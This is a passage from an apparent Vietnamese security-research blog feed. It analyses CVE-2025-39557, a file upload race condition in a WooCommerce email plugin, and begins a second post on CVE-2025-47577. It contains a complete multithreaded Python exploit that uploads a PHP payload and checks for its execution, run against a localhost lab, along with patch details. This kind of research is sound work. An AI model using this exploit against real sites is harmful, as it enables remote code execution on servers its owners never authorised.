&lt;code&gt;$_FILES[&#39;kadence-woomail-import-file&#39;]&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;import_export_requests&lt;/code&gt; được đăng ký làm callback cho action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;customize_register&amp;#39;, array( $this, &amp;#39;import_export_requests&amp;#39; ), 999999 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tức khi sử dụng chức năng tùy chỉnh giao diện (&lt;code&gt;customize.php&lt;/code&gt;) thì &lt;code&gt;import_export_requests&lt;/code&gt; sẽ được gọi.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Upload file via HTTP POST (kt-woomail-import &amp;#43; kadence-woomail-import-file)&amp;#34;] --&amp;gt; B[&amp;#34;wp_handle_upload($_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;], $overrides) called&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;File written to /wp-content/uploads/year/month/filename&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;file_exists($file[&amp;#39;file&amp;#39;]) → file_get_contents($file[&amp;#39;file&amp;#39;])&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;json_decode($raw) — attempt parse as JSON&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;If JSON invalid → base64_decode($raw) → unserialize()/mb_unserialize()&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Process/import template data&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;unlink($file[&amp;#39;file&amp;#39;]) — delete uploaded file&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;File removed from filesystem&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo script chạy song song giữ upload và đọc&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;import requests&#xA;from concurrent.futures import ThreadPoolExecutor&#xA;from datetime import datetime&#xA;import threading&#xA;&#xA;proxies = {&#xA;    &amp;#34;http&amp;#34;: &amp;#34;127.0.0.1:8080&amp;#34;,&#xA;    &amp;#34;https&amp;#34;: &amp;#34;127.0.0.1:8080&amp;#34;&#xA;}&#xA;&#xA;headers = {&#xA;    &amp;#34;User-Agent&amp;#34;: &amp;#34;curl/8.14.1&amp;#34;,&#xA;    &amp;#34;Accept&amp;#34;: &amp;#34;*/*&amp;#34;,&#xA;    &amp;#34;Connection&amp;#34;: &amp;#34;keep-alive&amp;#34;,&#xA;    &amp;#34;Cookie&amp;#34;: (&#xA;        &amp;#34;wordpress_86a9106ae65537651a8e456835b316ab=admin%7C1762274887%7Chr4bin8jsMpo40hHg8Ur3qVNiF2OrE8mhxy9mPjA4UV%7Ca49c2954010c0eed18aa2f49d261d70770dcf11a5cef221c9d43e56ed432f582; &amp;#34;&#xA;        &amp;#34;wordpress_test_cookie=WP%20Cookie%20check; &amp;#34;&#xA;        &amp;#34;wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1762274887%7Chr4bin8jsMpo40hHg8Ur3qVNiF2OrE8mhxy9mPjA4UV%7C514daa3c360a345b63ade229b137259ed3eed64ed9a7d2ac6679bb64774956be; &amp;#34;&#xA;        &amp;#34;mailpoet_subscriber=%7B%22subscriber_id%22%3A1%7D&amp;#34;&#xA;    )&#xA;}&#xA;&#xA;php_payload = &amp;#39;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;#39;&#xA;&#xA;upload_url = &amp;#34;http://localhost/wp-admin/customize.php?kt-woomail-customize=1&amp;#34;&#xA;check_url = &amp;#34;http://localhost/wp-content/uploads/&amp;lt;year&amp;gt;/&amp;lt;month&amp;gt;/&amp;lt;filename&amp;gt;.php&amp;#34;&#xA;&#xA;UPLOAD_THREADS = 40&#xA;CHECK_THREADS = 40&#xA;&#xA;upload_success_detected = threading.Event()&#xA;&#xA;def upload_worker(_):&#xA;    session = requests.Session()&#xA;    session.headers.update(headers)&#xA;    session.verify = False&#xA;&#xA;    files = {&#xA;        &amp;#39;kt-woomail-import&amp;#39;: (None, &amp;#39;5afa8d8781&amp;#39;),&#xA;        &amp;#39;kadence-woomail-import-file&amp;#39;: (&amp;#39;&amp;lt;filename&amp;gt;.php&amp;#39;, php_payload, &amp;#39;application/octet-stream&amp;#39;)&#xA;    }&#xA;&#xA;    while not upload_success_detected.is_set():&#xA;        try:&#xA;            response = session.post(&#xA;                upload_url,&#xA;                files=files,&#xA;                timeout=10&#xA;            )&#xA;&#xA;            ts = datetime.now().strftime(&amp;#34;%H:%M:%S&amp;#34;)&#xA;            if 200 &amp;lt;= response.status_code &amp;lt; 300:&#xA;                print(f&amp;#34;\033[92m[{ts}] [UPLOAD] Sent | 200 OK\033[0m&amp;#34;)&#xA;            else:&#xA;                print(f&amp;#34;\033[93m[{ts}] [UPLOAD] Failed | {response.status_code}\033[0m&amp;#34;)&#xA;&#xA;        except Exception as e:&#xA;            print(f&amp;#34;\033[91m[{datetime.now().strftime(&amp;#39;%H:%M:%S&amp;#39;)}] [UPLOAD ERROR] {e}\033[0m&amp;#34;)&#xA;&#xA;def check_worker(_):&#xA;    session = requests.Session()&#xA;    session.proxies.update(proxies)&#xA;    session.verify = False&#xA;&#xA;    while not upload_success_detected.is_set():&#xA;        try:&#xA;            response = session.get(check_url, timeout=8)&#xA;&#xA;            ts = datetime.now().strftime(&amp;#34;%H:%M:%S&amp;#34;)&#xA;            if response.status_code == 200 and len(response.text) &amp;gt; 0:&#xA;                print(f&amp;#34;\n\033[101m[{ts}] [RCE DETECTED!] File uploaded &amp;amp; executed!\033[0m&amp;#34;)&#xA;                upload_success_detected.set()&#xA;                break&#xA;            else:&#xA;                print(f&amp;#34;[{ts}] [CHECK] {response.status_code} | Not found yet...&amp;#34;)&#xA;&#xA;        except Exception as e:&#xA;            print(f&amp;#34;[{datetime.now().strftime(&amp;#39;%H:%M:%S&amp;#39;)}] [CHECK ERROR] {e}&amp;#34;)&#xA;&#xA;if __name__ == &amp;#34;__main__&amp;#34;:&#xA;    print(&amp;#34;\033[96m&amp;#34; &amp;#43; &amp;#34;=&amp;#34;*60)&#xA;    print(&amp;#34;   WORDPRESS KADENCE WOOMAIL UPLOAD EXPLOIT&amp;#34;)&#xA;    print(&amp;#34;   Upload &amp;#43; Auto Check Parallel Threads&amp;#34;)&#xA;    print(&amp;#34;=&amp;#34;*60 &amp;#43; &amp;#34;\033[0m&amp;#34;)&#xA;    print(f&amp;#34;[*] Upload URL : {upload_url}&amp;#34;)&#xA;    print(f&amp;#34;[*] Check URL  : {check_url}&amp;#34;)&#xA;    print(f&amp;#34;[*] Threads    : {UPLOAD_THREADS} (upload) &amp;#43; {CHECK_THREADS} (check)&amp;#34;)&#xA;    print(&amp;#34;[*] Press Ctrl&amp;#43;C to stop\n&amp;#34;)&#xA;&#xA;    try:&#xA;        with ThreadPoolExecutor(max_workers=UPLOAD_THREADS &amp;#43; CHECK_THREADS) as executor:&#xA;            upload_futures = [executor.submit(upload_worker, i) for i in range(UPLOAD_THREADS)]&#xA;            &#xA;            check_futures = [executor.submit(check_worker, i) for i in range(CHECK_THREADS)]&#xA;            &#xA;            upload_success_detected.wait()&#xA;&#xA;    except KeyboardInterrupt:&#xA;        print(&amp;#34;\n\033[93m[!] Stopped by user.\033[0m&amp;#34;)&#xA;    finally:&#xA;        upload_success_detected.set() &#xA;        print(&amp;#34;\033[91m[!] All threads terminated.\033[0m&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cụ thể:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Script này sẽ thực hiện việc đồng thời upload và check file đã upload, chỉ khi check được (&lt;code&gt;status=200&lt;/code&gt;) thì mới dừng lại&lt;/li&gt;&#xA;&lt;li&gt;Chức năng check sẽ đi qua proxy của BurpSuite để quan sát dữ liệu trả về và filter dễ dàng qua status code.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Lấy cookie và nonce thêm vào script&lt;/li&gt;&#xA;&lt;li&gt;Mở BurpSuite để quan sát request và response của script đi qua.&lt;/li&gt;&#xA;&lt;li&gt;Chạy script&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;python3 -m venv venv &#xA;source venv/bin/active&#xA;&#xA;pip install requests&#xA;python script.py&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Trên Terminal&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-08-cve-2025-39557/result_terminal.png&#34; title=&#34;Kết quả trên terminal&#34; data-thumbnail=&#34;/posts/2025-11-08-cve-2025-39557/result_terminal.png&#34; data-sub-html=&#34;&lt;h2&gt;Result Terminal&lt;/h2&gt;&lt;p&gt;Kết quả trên terminal&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-08-cve-2025-39557/result_terminal.png&#39; alt=&#34;Result Terminal&#34; height=&#34;290&#34; width=&#34;647&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả trên terminal&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Trên BurpSuite&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-08-cve-2025-39557/result_burp.png&#34; title=&#34;Kết quả trên BurpSuite&#34; data-thumbnail=&#34;/posts/2025-11-08-cve-2025-39557/result_burp.png&#34; data-sub-html=&#34;&lt;h2&gt;Result BurpSuite&lt;/h2&gt;&lt;p&gt;Kết quả trên BurpSuite&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-08-cve-2025-39557/result_burp.png&#39; alt=&#34;Result BurpSuite&#34; height=&#34;813&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả trên BurpSuite&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng xảy ra do plugin bỏ qua kiểm tra MIME (&lt;code&gt;test_type =&amp;gt; false&lt;/code&gt;) khi upload, cho phép tải lên file &lt;code&gt;.php&lt;/code&gt;. File bị xóa ngay sau xử lý, nhưng tồn tại ngắn đủ để khai thác qua &lt;strong&gt;race condition&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nguyên nhân: thiếu kiểm tra MIME + lưu file tạm trong thư mục public.&lt;/li&gt;&#xA;&lt;li&gt;Đã vá ở bản &lt;strong&gt;1.5.15&lt;/strong&gt; (&lt;code&gt;test_type =&amp;gt; true&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Giải pháp: luôn xác thực MIME, tránh lưu file thực thi vào thư mục public.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Upload via Race Condition&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/kadence-woocommerce-email-designer/vulnerability/wordpress-kadence-woocommerce-email-designer-plugin-1-5-14-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Kadence WooCommerce Email Designer Plugin &amp;lt;= 1.5.14 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-47577 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-07-cve-2025-47577/</link>
      <pubDate>Fri, 07 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-07-cve-2025-47577/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-07-cve-2025-47577/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;&amp;ldquo;Unrestricted Upload of File with Dangerous Type&amp;rdquo;&lt;/strong&gt; trong &lt;strong&gt;TemplateInvaders TI WooCommerce Wishlist&lt;/strong&gt; cho phép tải lên &lt;strong&gt;Web Shell&lt;/strong&gt; lên máy chủ web. Vấn đề này ảnh hưởng đến &lt;strong&gt;TI WooCommerce Wishlist&lt;/strong&gt;: từ &lt;strong&gt;n/a&lt;/strong&gt; đến &lt;strong&gt;before 2.10.0&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-47577&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-47577&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.9.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.10.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (10)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ti-woocommerce-wishlist/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress TI WooCommerce Wishlist Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;TI WooCommerce Wishlist&lt;/strong&gt;: &lt;strong&gt;2.9.2&lt;/strong&gt; (vulnerable) và &lt;strong&gt;2.10.0&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/woocommerce/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WooCommerce&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/wc-fields-factory/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WC Fields Factory&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 